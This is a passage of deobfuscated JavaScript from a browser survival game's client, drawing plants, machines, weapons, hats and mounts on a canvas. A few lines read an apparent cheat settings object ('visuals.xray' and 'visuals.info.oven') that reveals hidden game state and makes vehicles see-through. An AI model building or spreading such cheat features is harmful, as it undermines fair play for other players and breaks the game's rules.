          var t = Math.sin(this.hit.angle - this.angle) * e;
        } else {
          i = 0;
          t = 0;
        }
        this.ground.update();
        var r = sprite[Ie.PLANT_SEED][s_.time];
        var n = -r.width * this.ground.v;
        var a = -r.height * this.ground.v;
        Nn(D, r, -n / 2 + i, -a / 2 + t, n, a);
        D.restore();
      }
    }
    function Wa() {
      if (this.info !== 10) {
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        D.rotate(this.angle);
        if (this.hit.update) {
          if (this.hit.anim.update() && this.hit.anim.o == 0) {
            this.hit.update = false;
          }
          var e = (1 - this.hit.anim.v) * I_ * 600 * L;
          var i = Math.cos(this.hit.angle - this.angle) * e;
          var t = Math.sin(this.hit.angle - this.angle) * e;
        } else {
          i = 0;
          t = 0;
        }
        if (this.info & 16) {
          var r = sprite[Ie.DRIED_PLANT][s_.time];
        } else {
          r = sprite[Ie.PLANT_MINI][s_.time];
        }
        Nn(D, r, -r.width / 2 + i, -r.width / 2 + t);
        D.restore();
        for (var n = this.info & 15, a = 0; a < n; a++) {
          this.fruits[a].draw(Ie.FRUIT);
        }
      }
    }
    function Va() {
      if (!(this.info < 10)) {
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        D.rotate(this.angle);
        if (this.hit.update) {
          if (this.hit.anim.update() && this.hit.anim.o == 0) {
            this.hit.update = false;
          }
          var e = (1 - this.hit.anim.v) * I_ * 600 * L;
          var i = Math.cos(this.hit.angle - this.angle) * e;
          var t = Math.sin(this.hit.angle - this.angle) * e;
        } else {
          i = 0;
          t = 0;
        }
        this.ground.update();
        var r = sprite[Ie.PLANT_TOMATO][s_.time];
        var n = -r.width * this.ground.v;
        var a = -r.height * this.ground.v;
        Nn(D, r, -n / 2 + i, -a / 2 + t, n, a);
        D.restore();
      }
    }
    function wa() {
      if (this.info !== 10) {
        for (var e = this.info & 15, i = 0; i < e; i++) {
          this.fruits[i].draw(Ie.TOMATO, this.x, this.y);
        }
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        D.rotate(this.angle);
        if (this.hit.update) {
          if (this.hit.anim.update() && this.hit.anim.o == 0) {
            this.hit.update = false;
          }
          var t = (1 - this.hit.anim.v) * I_ * 600 * L;
          var r = Math.cos(this.hit.angle - this.angle) * t;
          var n = Math.sin(this.hit.angle - this.angle) * t;
        } else {
          r = 0;
          n = 0;
        }
        if (this.info & 16) {
          var a = sprite[Ie.DRIED_TOMATO_MINI][s_.time];
        } else {
          a = sprite[Ie.TOMATO_MINI][s_.time];
        }
        Nn(D, a, -a.width / 2 + r, -a.width / 2 + n);
        D.restore();
      }
    }
    function Ka() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      if (this.action == 2) {
        img = sprite[Ie.FURNACE_ON][s_.time];
      } else {
        img = sprite[Ie.FURNACE_OFF][s_.time];
      }
      Nn(D, img, -img.width / 2 + i, -img.height / 2 + t);
      D.restore();
    }
    function Ua() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.ground.update();
      D.globalAlpha = 0.3;
      var e = sprite[Ie.GROUND_FIRE][s_.time];
      var i = -e.width * this.ground.v;
      var t = -e.height * this.ground.v;
      Nn(D, e, -i / 2, -t / 2, i, t);
      D.globalAlpha = 1;
      D.restore();
    }
    function Ya() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.info & 31 && this.info & 992 && (this.info & 31744) != 31744 && (this.smog.length == 0 || this.smog[this.smog.length - 1] <= Ie.SMOG_PUSH)) {
        this.smog.push(Ie.SMOG);
      }
      for (var e = 0; e < this.smog.length; e++) {
        this.smog[e] = Math.max(0, this.smog[e] - I_ * Ie.SMOG_SPEED);
        D.globalAlpha = this.smog[e] / 1.3;
        var i = (1 - this.smog[e]) * 40;
        var t = (1 - this.smog[e]) * 35 + 10;
        ze(D, L * -68 + Math.cos(-this.angle - Math.PI / 2) * i, L * -20 + Math.sin(-this.angle - Math.PI / 2) * i, t);
        ye(D, "#333333");
      }
      D.globalAlpha = 1;
      if (this.smog.length > 0 && this.smog[0] === 0) {
        this.smog.shift();
      }
      D.restore();
    }
    function ka(e) {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.ground.update();
      D.globalAlpha = 0.3;
      var i = sprite[Ie.GROUND_FIRE][s_.time];
      var t = -i.width * this.ground.v;
      var r = -i.height * this.ground.v;
      Nn(D, i, -t / 2, -r / 2, t, r);
      D.globalAlpha = 1;
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var n = (1 - this.hit.anim.v) * I_ * 600 * L;
        var a = Math.cos(this.hit.angle - this.angle) * n;
        var o = Math.sin(this.hit.angle - this.angle) * n;
      } else {
        a = 0;
        o = 0;
      }
      i = sprite[e][s_.time];
      Nn(D, i, -i.width / 2 + a, -i.height / 2 + o);
      D.restore();
    }
    function Fa() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      if (this.info === 0) {
        img = sprite[Ie.SIGN][s_.time];
      } else {
        img = sprite[Ie.SYMBOLS][s_.time][this.info - 1];
      }
      Nn(D, img, -img.width / 2 + i, -img.height / 2 + t);
      D.restore();
    }
    function xa() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      if (this.info & 31 && this.info & 992 && (this.info & 31744) != 31744) {
        n = sprite[Ie.BREAD_OVEN_ON][s_.time];
        Nn(D, n, -n.width / 2 + i, -n.height / 2 + t);
        this.up.update();
        var n = sprite[Ie.BREAD_LIGHT_UP][s_.time];
        var a = -n.width * this.up.v;
        var o = -n.height * this.up.v;
        Nn(D, n, -a / 2 + L * 1, -o / 2 + L * 3, a, o);
      } else {
        n = sprite[Ie.BREAD_OVEN_OFF][s_.time];
        Nn(D, n, -n.width / 2 + i, -n.height / 2 + t);
      }
      if (r.visuals.info.oven) {
        D.save();
        D.beginPath();
        D.lineWidth = 7;
        D.fillStyle = "white";
        D.strokeStyle = "black";
        D.font = "20px Baloo Paaji";
        D.rotate(-this.angle);
        D.strokeText((this.info & 31) + "x", -10, -20);
        D.strokeText(((this.info & 992) >> 5) + "x", -10, 0);
        D.strokeText(((this.info & 31744) >> 10) + "x", -10, 20);
        D.fillText((this.info & 31) + "x", -10, -20);
        D.fillText(((this.info & 992) >> 5) + "x", -10, 0);
        D.fillText(((this.info & 31744) >> 10) + "x", -10, 20);
        D.restore();
      }
      D.restore();
    }
    function Ja() {
      if (this.hit.update) {
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      if (this.info & 255 && (this.info & 65280) != 65280) {
        this.rotate = (this.rotate + I_ * 0.5) % (Math.PI * 2);
      }
      D.save();
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.save();
      D.rotate(this.rotate);
      img = sprite[Ie.WINDMILL_WINGS][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.save();
      D.rotate(this.angle);
      img = sprite[Ie.WINDMILL_HEAD][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.restore();
    }
    function Xa() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      D.save();
      if (this.info & 255 && (this.info & 65280) != 65280) {
        i += Math.random() * 2 - 1;
        t += Math.random() * 2 - 1;
      }
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.rotate(this.angle);
      img = sprite[Ie.EXTRACTOR_MACHINE_STONE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      if (this.info & 255 && (this.info & 65280) != 65280) {
        this.rotate = (this.rotate + I_ * 3) % (Math.PI * 2);
      }
      D.rotate(this.rotate);
      img = sprite[Ie.EXTRACTOR_MACHINE0_STONE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
    }
    function qa() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      D.save();
      if (this.info & 255 && (this.info & 65280) != 65280) {
        i += Math.random() * 2 - 1;
        t += Math.random() * 2 - 1;
      }
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.rotate(this.angle);
      img = sprite[Ie.EXTRACTOR_MACHINE_GOLD][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      if (this.info & 255 && (this.info & 65280) != 65280) {
        this.rotate = (this.rotate + I_ * 3) % (Math.PI * 2);
      }
      D.rotate(this.rotate);
      img = sprite[Ie.EXTRACTOR_MACHINE0_GOLD][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
    }
    function ja() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      D.save();
      if (this.info & 255 && (this.info & 65280) != 65280) {
        i += Math.random() * 2 - 1;
        t += Math.random() * 2 - 1;
      }
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.rotate(this.angle);
      img = sprite[Ie.EXTRACTOR_MACHINE_DIAMOND][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      if (this.info & 255 && (this.info & 65280) != 65280) {
        this.rotate = (this.rotate + I_ * 3) % (Math.PI * 2);
      }
      D.rotate(this.rotate);
      img = sprite[Ie.EXTRACTOR_MACHINE0_DIAMOND][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
    }
    function Za() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      D.save();
      if (this.info & 255 && (this.info & 65280) != 65280) {
        i += Math.random() * 2 - 1;
        t += Math.random() * 2 - 1;
      }
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.rotate(this.angle);
      img = sprite[Ie.EXTRACTOR_MACHINE_AMETHYST][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      if (this.info & 255 && (this.info & 65280) != 65280) {
        this.rotate = (this.rotate + I_ * 3) % (Math.PI * 2);
      }
      D.rotate(this.rotate);
      img = sprite[Ie.EXTRACTOR_MACHINE0_AMETHYST][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
    }
    function Qa() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      D.save();
      if (this.info & 255 && (this.info & 65280) != 65280) {
        i += Math.random() * 2 - 1;
        t += Math.random() * 2 - 1;
      }
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.rotate(this.angle);
      img = sprite[Ie.EXTRACTOR_MACHINE_REIDITE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      if (this.info & 255 && (this.info & 65280) != 65280) {
        this.rotate = (this.rotate + I_ * 3) % (Math.PI * 2);
      }
      D.rotate(this.rotate);
      img = sprite[Ie.EXTRACTOR_MACHINE0_REIDITE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
    }
    function $a() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      D.save();
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.rotate(this.angle);
      img = sprite[Ie.WINDMILL][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
    }
    function eo() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      this.rotate1 = (this.rotate1 + I_ * 3) % (Math.PI * 2);
      this.rotate2 = (this.rotate2 - I_ * 3) % (Math.PI * 2);
      D.save();
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.save();
      D.rotate(this.angle);
      img = sprite[Ie.EMERALD_MACHINE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.save();
      D.rotate(this.rotate1);
      img = sprite[Ie.EMERALD_MACHINE_ROTATE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.save();
      D.rotate(this.rotate2);
      img = sprite[Ie.EMERALD_MACHINE_HOLE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.restore();
    }
    function io() {
      if (this.hit.update) {
        if (this.hit.anim.update() && this.hit.anim.o == 0) {
          this.hit.update = false;
        }
        var e = (1 - this.hit.anim.v) * I_ * 600 * L;
        var i = Math.cos(this.hit.angle - this.angle) * e;
        var t = Math.sin(this.hit.angle - this.angle) * e;
      } else {
        i = 0;
        t = 0;
      }
      this.rotate1 = (this.rotate1 + I_ * 3) % (Math.PI * 2);
      this.rotate2 = (this.rotate2 - I_ * 3) % (Math.PI * 2);
      D.save();
      D.translate(__.cam.x + this.x + i, __.cam.y + this.y + t);
      D.save();
      D.rotate(this.angle);
      img = sprite[Ie.RESURRECTION][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.save();
      D.rotate(this.rotate1);
      img = sprite[Ie.RESURRECTION_ROTATE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.save();
      D.rotate(this.rotate2);
      img = sprite[Ie.RESURRECTION_HOLE][s_.time];
      Nn(D, img, -img.width / 2, -img.height / 2);
      D.restore();
      D.restore();
    }
    function to() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.halo.update();
      img = sprite[Ie.EMERALD_MACHINE_GROUND][s_.time];
      w = -img.width * this.halo.v;
      h = -img.height * this.halo.v;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function ro() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.halo.update();
      img = sprite[Ie.RESURRECTION_GROUND][s_.time];
      w = -img.width * this.halo.v;
      h = -img.height * this.halo.v;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function no() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.halo.update();
      img = sprite[Ie.HALO_FIRE][s_.time];
      w = -img.width * this.halo.v;
      h = -img.height * this.halo.v;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function ao() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      D.rotate(this.angle);
      this.fire.update();
      img = sprite[Ie.FIRE][s_.time];
      w = -img.width * this.fire.v;
      h = -img.height * this.fire.v;
      Nn(D, img, -w / 2, -h / 2, w, h);
      this.halo.update();
      img = sprite[Ie.HALO_FIRE][s_.time];
      w = -img.width * this.halo.v;
      h = -img.height * this.halo.v;
      Nn(D, img, -w / 2, -h / 2, w, h);
      D.restore();
    }
    function oo(e, i, t) {
      if (e >= 0) {
        img = sprite[e][s_.time];
        switch (e) {
          case Ie.WOOD_SHIELD:
          case Ie.STONE_SHIELD:
          case Ie.GOLD_SHIELD:
            Ho(e, img, -img.width / 4 - L * (0 + i), -img.height / 4 + L * (t + 35));
            break;
          case Ie.DIAMOND_SHIELD:
            Ho(e, img, -img.width / 4 - L * (1 + i), -img.height / 4 + L * (t + 45));
            break;
          case Ie.AMETHYST_SHIELD:
          case Ie.REIDITE_SHIELD:
            Ho(e, img, -img.width / 4 - L * (1 + i), -img.height / 4 + L * (t + 40));
        }
      }
    }
    function so(e, i, t) {
      if (e >= 0) {
        img = sprite[e][s_.time];
        switch (e) {
          case Ie.PICK:
          case Ie.PICK_GOLD:
          case Ie.PICK_DIAMOND:
          case Ie.PICK_WOOD:
          case Ie.PICK_AMETHYST:
          case Ie.PICK_REIDITE:
            Go(e, img, -img.width / 2 - L * (45 + i), -img.height / 2 + L * (t + 22));
            break;
          case Ie.SWORD_WOOD:
          case Ie.SWORD:
          case Ie.SWORD_GOLD:
          case Ie.SWORD_DIAMOND:
            Ho(e, img, -img.width / 4 - L * (47 + i), -img.height / 4 + L * (t + 45));
            break;
          case Ie.SWORD_AMETHYST:
            Ho(e, img, -img.width / 4 - L * (52 + i), -img.height / 4 + L * (t + 45));
            break;
          case Ie.REIDITE_SWORD:
            Ho(e, img, -img.width / 4 - L * (47 + i), -img.height / 4 + L * (t + 44));
            break;
          case Ie.PIRATE_SWORD:
            Go(e, img, -img.width / 2 - L * (47 + i), -img.height / 2 + L * (t + 44));
            break;
          case Ie.DRAGON_SWORD:
            Go(e, img, -img.width / 2 - L * (40 + i), -img.height / 2 + L * (t + 65));
            break;
          case Ie.WOOD_SPEAR:
          case Ie.REIDITE_SPEAR:
            Ho(e, img, -img.width / 4 - L * (37 + i), -img.height / 4 + L * (t + 85));
            break;
          case Ie.PITCHFORK2:
          case Ie.PITCHFORK:
            Ho(e, img, -img.width / 4 - L * (26 + i), -img.height / 4 + L * (t + 77));
            break;
          case Ie.LAVA_SPEAR:
            Ho(e, img, -img.width / 4 - L * (37 + i), -img.height / 4 + L * (t + 85));
            break;
          case Ie.LAVA_SWORD:
            Ho(e, img, -img.width / 4 - L * (47 + i), -img.height / 4 + L * (t + 44));
            break;
          case Ie.WOOD_BOW:
          case Ie.STONE_BOW:
          case Ie.GOLD_BOW:
          case Ie.DIAMOND_BOW:
          case Ie.AMETHYST_BOW:
          case Ie.REIDITE_BOW:
          case Ie.DRAGON_BOW:
            Ho(e, img, -img.width / 4 - L * (37 + i), -img.height / 4 + L * (t + 30));
            break;
          case Ie.MACHETE:
            Ho(e, img, -img.width / 4 - L * (47 + i), -img.height / 4 + L * (t + 35));
            break;
          case Ie.WAND1:
          case Ie.WAND2:
            Ho(e, img, -img.width / 4 - L * (47 + i), -img.height / 4 + L * (t + 40));
            break;
          case Ie.SADDLE:
            Ho(e, img, -img.width / 4 - L * (47 + i), -img.height / 4 + L * (t + 34));
            break;
          case Ie.SPEAR:
          case Ie.GOLD_SPEAR:
          case Ie.DIAMOND_SPEAR:
          case Ie.AMETHYST_SPEAR:
            Ho(e, img, -img.width / 4 - L * (37 + i), -img.height / 4 + L * (t + 90));
            break;
          case Ie.CRAB_SPEAR:
            Ho(e, img, -img.width / 4 - L * (40 + i), -img.height / 4 + L * (t + 85));
            break;
          case Ie.DRAGON_SPEAR:
            Go(e, img, -img.width / 2 - L * (39 + i), -img.height / 2 + L * (t + 90));
            break;
          case Ie.HAMMER:
          case Ie.HAMMER_GOLD:
          case Ie.HAMMER_DIAMOND:
          case Ie.HAMMER_AMETHYST:
          case Ie.HAMMER_REIDITE:
          case Ie.SUPER_HAMMER:
            Go(e, img, -img.width / 2 - L * (46 + i), -img.height / 2 + L * (t + 35));
            break;
          case Ie.WATERING_CAN_FULL:
            Go(e, img, -img.width / 2 - L * (47 + i), -img.height / 2 + L * (t + 54));
            break;
          case Ie.SHOVEL:
          case Ie.SHOVEL_GOLD:
          case Ie.SHOVEL_DIAMOND:
          case Ie.SHOVEL_AMETHYST:
            Go(e, img, -img.width / 2 - L * (46 + i), -img.height / 2 + L * (t + 35));
            break;
          case Ie.SPANNER:
            Go(e, img, -img.width / 2 - L * (47 + i), -img.height / 2 + L * (t + 20));
        }
      }
    }
    var _o = function (e) {
      if (e > 0) {
        var i = sprite[e][s_.time];
        switch (e) {
          case Ie.WOOD_HELMET:
            Go(e, i, -i.width / 2 + L * 2, -i.height / 2 - L * 5);
            break;
          case Ie.EARMUFFS:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 18);
            break;
          case Ie.COAT:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 10);
            break;
          case Ie.EXPLORER_HAT:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 19);
            break;
          case Ie.PIRATE_HAT:
            Ho(e, i, -i.width / 4, -i.height / 4 - L * 20);
            break;
          case Ie.STONE_HELMET:
            Go(e, i, -i.width / 2 - L * 1, -i.height / 2 - L * 23);
            break;
          case Ie.GOLD_HELMET:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 5);
            break;
          case Ie.DIAMOND_HELMET:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 2);
            break;
          case Ie.AMETHYST_HELMET:
            Go(e, i, -i.width / 2 + L * 1.5, -i.height / 2 - L * 1);
            break;
          case Ie.REIDITE_HELMET:
          case Ie.DIAMOND_PROTECTION:
          case Ie.AMETHYST_PROTECTION:
          case Ie.REIDITE_PROTECTION:
          case Ie.TURBAN1:
          case Ie.TURBAN2:
          case Ie.PILOT_HELMET:
          case Ie.LAVA_HELMET:
          case Ie.WITCH:
          case Ie.FUR_HAT:
          case Ie.FLOWER_HAT:
            Ho(e, i, -i.width / 4, -i.height / 4 + L * 2);
            break;
          case Ie.CHRISTMAS_HAT:
          case Ie.ELF_HAT:
            Go(e, i, -i.width / 2 - L * 5, -i.height / 2 - L * 2);
            break;
          case Ie.CAP_SCARF:
          case Ie.WINTER_HOOD:
          case Ie.DIVING_MASK:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 2);
            break;
          case Ie.SUPER_DIVING_SUIT:
            Go(e, i, -i.width / 2 + L * 2, -i.height / 2);
            break;
          case Ie.DRAGON_HELMET:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 5);
            break;
          case Ie.CROWN_GREEN:
          case Ie.CROWN_ORANGE:
          case Ie.CROWN_BLUE:
            Go(e, i, -i.width / 2 - L * 1, -i.height / 2);
            break;
          case Ie.HOOD:
            Go(e, i, -i.width / 2, -i.height / 2 + L * 2);
            break;
          case Ie.PEASANT:
          case Ie.WINTER_PEASANT:
            Go(e, i, -i.width / 2, -i.height / 2 + L * 8);
            break;
          case Ie.CROWN_CRAB:
            Go(e, i, -i.width / 2, -i.height / 2 - L * 4);
        }
      }
    };
    function Eo() {
      if (!this.ghost && this.vehicle !== 0) {
        if (this.x != this.r.x || this.y != this.r.y) {
          var e = (Utils.get_angle_2(this.x, this.y, this.r.x, this.r.y) + Math.PI / 2) % (Math.PI * 2);
          this.vehicle_fx2 = Utils.reduceAngle(e, this.vehicle_fx2);
          this.vehicle_fx2 = Utils.lerp(this.vehicle_fx2, e, 0.018);
        }
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        D.rotate(this.vehicle_fx2);
        if (r.visuals.xray.vehicle) {
          D.globalAlpha = r.visuals.xray.opacity;
        }
        if (this.vehicle === le.BOAT) {
          if (this.speed > 50 || this.vehicle_fx1 > 0) {
            if (this.speed > 50) {
              this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + I_);
            } else {
              this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - I_);
            }
            D.globalAlpha = this.vehicle_fx1;
            var i = sprite[Ie.BOAT_WAVE][s_.time];
            Ho(Ie.BOAT_WAVE, i, -i.width / 4, -i.height / 4);
            D.globalAlpha = 1;
          }
          i = sprite[Ie.BOAT][s_.time];
          Ho(Ie.BOAT, i, -i.width / 4, -i.height / 4);
        } else if (this.vehicle === le.HAWK) {
          this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, 0.018);
          this.vehicle_fx4.update();
          if (this.speed > 85) {
            this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + I_ / 4);
          } else {
            this.vehicle_fx1 = Math.max(0.1, this.vehicle_fx1 - I_);
          }
          i = sprite[Ie.HAWK_TAMED][s_.time];
          Ho(Ie.HAWK_TAMED, i, -i.width / 4, -i.height / 4);
          i = sprite[Ie.HAWK_WING_LEFT_TAMED][s_.time];
          w = -i.width;
          h = -i.height;
          D.save();
          D.translate(L * -20, L * -20);
          D.rotate(this.vehicle_fx4.v * this.vehicle_fx1);
          Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
          D.restore();
          i = sprite[Ie.HAWK_WING_RIGHT_TAMED][s_.time];
          D.save();
          D.translate(L * 20, L * -20);
          D.rotate(-this.vehicle_fx4.v * this.vehicle_fx1);
          Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
          D.restore();
        } else if (this.vehicle === le.BABY_LAVA) {
          this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, 0.018);
          this.vehicle_fx4.update();
          if (this.speed > 85) {
            this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + I_ / 4);
          } else {
            this.vehicle_fx1 = Math.max(0.1, this.vehicle_fx1 - I_);
          }
          i = sprite[Ie.BABY_LAVA_TAMED][s_.time];
          Ho(Ie.BABY_LAVA_TAMED, i, -i.width / 4, -i.height / 4);
          i = sprite[Ie.BABY_LAVA_WING_LEFT_TAMED][s_.time];
          w = -i.width;
          h = -i.height;
          D.save();
          D.translate(L * -40, L * -45);
          D.rotate(this.vehicle_fx4.v * this.vehicle_fx1);
          Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
          D.restore();
          i = sprite[Ie.BABY_LAVA_WING_RIGHT_TAMED][s_.time];
          D.save();
          D.translate(L * 40, L * -45);
          D.rotate(-this.vehicle_fx4.v * this.vehicle_fx1);
          Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
          D.restore();
        } else if (this.vehicle === le.BABY_DRAGON) {
          this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, 0.018);
          this.vehicle_fx4.update();
          if (this.speed > 85) {
            this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + I_ / 4);
          } else {
            this.vehicle_fx1 = Math.max(0.1, this.vehicle_fx1 - I_);
          }
          i = sprite[Ie.BABY_DRAGON_TAMED][s_.time];
          Ho(Ie.BABY_DRAGON_TAMED, i, -i.width / 4, -i.height / 4);
          i = sprite[Ie.BABY_DRAGON_WING_LEFT_TAMED][s_.time];
          w = -i.width;
          h = -i.height;
          D.save();
          D.translate(L * -40, L * -45);
          D.rotate(this.vehicle_fx4.v * this.vehicle_fx1);
          Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
          D.restore();
          i = sprite[Ie.BABY_DRAGON_WING_RIGHT_TAMED][s_.time];
          D.save();
          D.translate(L * 40, L * -45);
          D.rotate(-this.vehicle_fx4.v * this.vehicle_fx1);
          Nn(D, i, -w / 4, -h / 4, w / 2, h / 2);
          D.restore();
        } else if (this.vehicle === le.NIMBUS) {
          this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, 0.018);
          i = sprite[Ie.NIMBUS][s_.time];
          Ho(Ie.NIMBUS, i, -i.width / 4, -i.height / 4);
        } else if (this.vehicle === le.PLANE) {
          this.vehicle_fx5 = Utils.lerp(this.vehicle_fx5, this.speed, 0.018);
          i = sprite[Ie.PLANE][s_.time];
          Ho(Ie.PLANE, i, -i.width / 4, -i.height / 4);
        } else if (this.vehicle === le.SLED) {
          i = sprite[Ie.SLED][s_.time];
          Ho(Ie.SLED, i, -i.width / 4, -i.height / 4);
        } else if (this.vehicle === le.BABY_MAMMOTH) {
          i = sprite[Ie.BABY_MAMMOTH_TAMED][s_.time];
          if (this.speed > 85) {
            this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + I_ / 4);
          } else {
            this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - I_);
          }
          this.vehicle_fx3 += I_ * 60;
